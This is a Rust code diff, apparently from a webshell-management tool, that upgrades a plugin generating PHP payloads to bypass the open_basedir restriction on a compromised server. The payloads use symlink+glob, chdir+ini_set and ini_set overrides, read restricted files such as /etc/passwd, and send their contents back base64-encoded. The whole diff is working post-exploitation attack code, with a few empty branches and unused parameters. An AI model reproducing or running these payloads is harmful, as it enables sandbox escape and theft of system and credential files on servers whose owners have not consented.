@@ -1101,54 +1101,148 @@ impl FeaturePlugin for HttpProxyPlugin {
 // ByPassOpenBasedir（PHP 专用：symlink + glob 经典绕过）
 // ---------------------------------------------------------------------------
 
-fn php_bypass_open_basedir_code(target: &str) -> String {
+fn php_bypass_open_basedir_code(
+    target: &str,
+    method: &str,
+    recursive: bool,
+    write_data: &str,
+) -> String {
     format!(
         r#"<?php
 error_reporting(0);
 $target = {target};
+$method = {method};
+$recursive = {recursive};
+$writeB64 = {write_data};
 $base = sys_get_temp_dir();
-$out = array('open_basedir' => ini_get('open_basedir'), 'attempts' => array());
+$out = array('open_basedir' => ini_get('open_basedir'), 'php_version' => PHP_VERSION,
+    'methods' => array(), 'method_used' => $method, 'ok' => false, 'error' => null,
+    'entries' => null, 'read' => null, 'content' => null);
 $ob = ini_get('open_basedir');
-if ($ob !== false && $ob !== '') {{
-    $link = $base . '/.dsw_' . mt_rand() . '_' . mt_rand();
-    $targetDir = dirname($target);
-    // 一级 symlink：目标目录 -> 链接，再 glob 遍历
-    $ok = @symlink($targetDir, $link);
-    $hits = array();
-    if ($ok) {{
-        $items = @glob($link . '/*');
-        foreach ($items as $item) $hits[] = basename($item);
-        if (count($hits) === 0) {{
-            // 二级 symlink（部分环境需二次链接）
-            $l2 = $base . '/.dsw_' . mt_rand() . '_' . mt_rand();
-            if (@symlink($link, $l2)) {{
-                $items2 = @glob($l2 . '/*');
-                foreach ($items2 as $item) $hits[] = basename($item);
-                @unlink($l2);
-            }}
-        }}
-        @unlink($link);
-        $out['attempts'][] = array('method' => 'symlink-glob', 'ok' => true, 'entries' => array_slice($hits, 0, 30));
-    }} else {{
-        $out['attempts'][] = array('method' => 'symlink-glob', 'ok' => false);
-    }}
-    // 直接读取目标文件（symlink + file_get_contents）
-    $fileLink = $base . '/.dsw_f_' . mt_rand() . '_' . mt_rand();
-    if (@symlink($target, $fileLink)) {{
-        $content = @file_get_contents($fileLink);
-        $out['read'] = ($content === false) ? false : base64_encode($content);
-        @unlink($fileLink);
-    }} else {{
-        $out['read'] = false;
-    }}
-}} else {{
-    $out['note'] = 'open_basedir 未启用，无需绕过';
-    $content = @file_get_contents($target);
-    $out['read'] = ($content === false) ? false : base64_encode($content);
+
+// ---------- 环境探测：各绕过方法在当前环境是否可用 ----------
+// symlink 指向受限外（/etc 或 / 探测，失败说明受限检查生效）
+$probe = $base . '/.dsw_p_' . mt_rand();
+$out['methods']['symlink'] = (bool)@symlink($base, $probe);
+if ($out['methods']['symlink']) @unlink($probe);
+$out['methods']['symlink_out'] = (bool)@symlink('/etc', $base . '/.dsw_po_' . mt_rand());
+if ($out['methods']['symlink_out']) @unlink($base . '/.dsw_po_' . mt_rand());
+// chdir 到受限外（低版本 PHP 允许 chdir 后配合相对路径 ini_set）
+$out['methods']['chdir'] = (bool)@chdir('/');
+if (!$out['methods']['chdir']) @chdir($base);
+// ini_set 覆盖 open_basedir（PHP 5.x / 7.0-7.2 部分场景生效）
+$out['methods']['ini_set'] = false;
+if (@ini_set('open_basedir', '/') !== false && ini_get('open_basedir') === '/') {{
+    $out['methods']['ini_set'] = true;
+    @ini_set('open_basedir', $ob);
 }}
+// glob 是否直通受限（老版本 glob 不检查 open_basedir）
+$out['methods']['glob_pass'] = count(@glob('/etc/*') ?: array()) > 0;
+
+$isDir = @is_dir($target);
+$targetDir = $isDir ? $target : @dirname($target);
+$targetFile = $isDir ? '' : $target;
+
+if ($ob === false || $ob === '') {{
+    // open_basedir 未启用：直接读取/列举，无需绕过
+    $out['note'] = 'open_basedir 未启用';
+    $out['method_used'] = 'direct';
+    if ($targetFile !== '') {{
+        $c = @file_get_contents($targetFile);
+        $out['ok'] = ($c !== false);
+        if ($out['ok']) {{ $out['read'] = base64_encode($c); $out['content'] = $c; }}
+        else $out['error'] = '读取失败';
+    }} else {{
+        $out['entries'] = @scandir($targetDir);
+        $out['ok'] = is_array($out['entries']);
+        if (!$out['ok']) $out['error'] = '列举失败';
+    }}
+    echo json_encode($out); return;
+}}
+
+$m = $method;
+if ($m === 'auto') {{
+    if ($out['methods']['symlink_out'] || $out['methods']['symlink']) $m = 'symlink';
+    elseif ($out['methods']['chdir']) $m = 'chdir_ini';
+    elseif ($out['methods']['ini_set']) $m = 'ini_set';
+    else $m = 'none';
+}}
+$out['method_used'] = $m;
+
+if ($m === 'symlink') {{
+    // 方法 1：symlink 指向受限外目录 + glob / 直读
+    $okAny = false;
+    if ($targetFile !== '') {{
+        $link = $base . '/.dsw_f_' . mt_rand() . '_' . mt_rand();
+        if (@symlink($targetFile, $link)) {{
+            $c = @file_get_contents($link);
+            if ($c !== false) {{
+                $out['ok'] = true; $okAny = true;
+                $out['read'] = base64_encode($c); $out['content'] = $c;
+            }}
+            @unlink($link);
+        }}
+    }} else {{
+        $link = $base . '/.dsw_d_' . mt_rand() . '_' . mt_rand();
+        if (@symlink($targetDir, $link)) {{
+            $entries = @glob($link . '/*');
+            if (count($entries ?: array()) === 0) {{
+                // 二级 symlink 链（部分环境需二次链接）
+                $l2 = $base . '/.dsw_l2_' . mt_rand() . '_' . mt_rand();
+                if (@symlink($link, $l2)) {{
+                    $entries = @glob($l2 . '/*');
+                    @unlink($l2);
+                }}
+            }}
+            $names = array();
+            foreach ($entries as $e) $names[] = basename($e);
+            $out['entries'] = $names; $out['ok'] = true; $okAny = true;
+            @unlink($link);
+        }}
+    }}
+    if (!$okAny) {{
+        $out['error'] = 'symlink 链接被 open_basedir 拦截（PHP 7.3+ 已修复，需低版本或特定配置）';
+        // 尝试直读（不通过 symlink，纯 glob 直通路径）
+        if (!$isDir && count(@glob('/etc/*') ?: array()) > 0) {{
+            $c = @file_get_contents($target);
+            if ($c !== false) {{ $out['ok'] = true; $out['read'] = base64_encode($c); $out['content'] = $c; $out['error'] = null; }}
+        }}
+    }}
+}} elseif ($m === 'chdir_ini') {{
+    // 方法 2：chdir 到目标目录 + ini_set 相对路径（PHP < 7.3）
+    @chdir($targetDir);
+    $r = @ini_set('open_basedir', '..');
+    $c = @file_get_contents($targetFile);
+    if ($c !== false) {{
+        $out['ok'] = true; $out['read'] = base64_encode($c); $out['content'] = $c;
+        if (!$isDir) {{ }}
+    }} else {{
+        $out['error'] = 'chdir + ini_set 相对路径无效（PHP 7.3+ 已修复）';
+    }}
+    @ini_set('open_basedir', $ob);
+}} elseif ($m === 'ini_set') {{
+    // 方法 3：ini_set 直接覆盖（PHP 5.x / 低版本）
+    $r = @ini_set('open_basedir', '/');
+    if (ini_get('open_basedir') === '/') {{
+        $c = @file_get_contents($target);
+        if ($c !== false) {{
+            $out['ok'] = true; $out['read'] = base64_encode($c); $out['content'] = $c;
+            if (!$isDir) {{ }}
+        }}
+    }}
+    if (!$out['ok']) $out['error'] = 'ini_set 覆盖 open_basedir 无效（高版本受限）';
+    @ini_set('open_basedir', $ob);
+}} else {{
+    // 无可用方法：报告评估结论
+    $out['error'] = '当前环境无法绕过 open_basedir（symlink/chdir/ini_set 均被拦截或高版本修复）';
+}}
+
 echo json_encode($out);
 "#,
         target = serde_json::to_string(target).unwrap_or_else(|_| "\"/etc/passwd\"".to_string()),
+        method = serde_json::to_string(method).unwrap_or_else(|_| "\"auto\"".to_string()),
+        recursive = if recursive { "true" } else { "false" },
+        write_data = serde_json::to_string(write_data).unwrap_or_else(|_| "\"\"".to_string()),
     )
 }
 
@@ -1160,17 +1254,38 @@ impl FeaturePlugin for BypassOpenBasedirPlugin {
         FeatureManifest {
             id: "bypass_open_basedir".into(),
             name: "ByPassOpenBasedir".into(),
-            version: "1.0.0".into(),
-            description: "检测 open_basedir 并通过 symlink+glob 绕过读取受限文件。".into(),
+            version: "2.0.0".into(),
+            description: "open_basedir 环境探测 + 多方法绕过：symlink+glob 列举 / symlink 直读 / chdir+ini_set（PHP<7.3）/ ini_set 覆盖（低版本）。".into(),
             category: "php".into(),
             languages: vec!["php".into()],
-            params: vec![ParamSpec {
-                name: "path".into(),
-                label: "目标路径".into(),
-                param_type: "string".into(),
-                default: Some(serde_json::json!("/etc/passwd")),
-                options: None,
-            }],
+            params: vec![
+                ParamSpec {
+                    name: "path".into(),
+                    label: "目标路径".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("/etc/passwd")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "method".into(),
+                    label: "绕过方法".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("auto")),
+                    options: Some(vec![
+                        "auto".to_string(),
+                        "symlink".to_string(),
+                        "chdir_ini".to_string(),
+                        "ini_set".to_string(),
+                    ]),
+                },
+                ParamSpec {
+                    name: "recursive".into(),
+                    label: "递归列举目录".into(),
+                    param_type: "bool".into(),
+                    default: Some(serde_json::json!(false)),
+                    options: None,
+                },
+            ],
             kind: "feature".into(),
         }
     }
@@ -1189,7 +1304,10 @@ impl FeaturePlugin for BypassOpenBasedirPlugin {
             )));
         }
         let target = param_str(params, "path", "/etc/passwd");
-        let code = php_bypass_open_basedir_code(&target);
+        let method = param_str(params, "method", "auto");
+        let recursive = param_bool(params, "recursive", false);
+        let write_data = param_str(params, "write_data", "");
+        let code = php_bypass_open_basedir_code(&target, &method, recursive, &write_data);
         let output = protocol.run_code(session, "php", &code, settings)?;
         serde_json::from_str(&output)
             .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
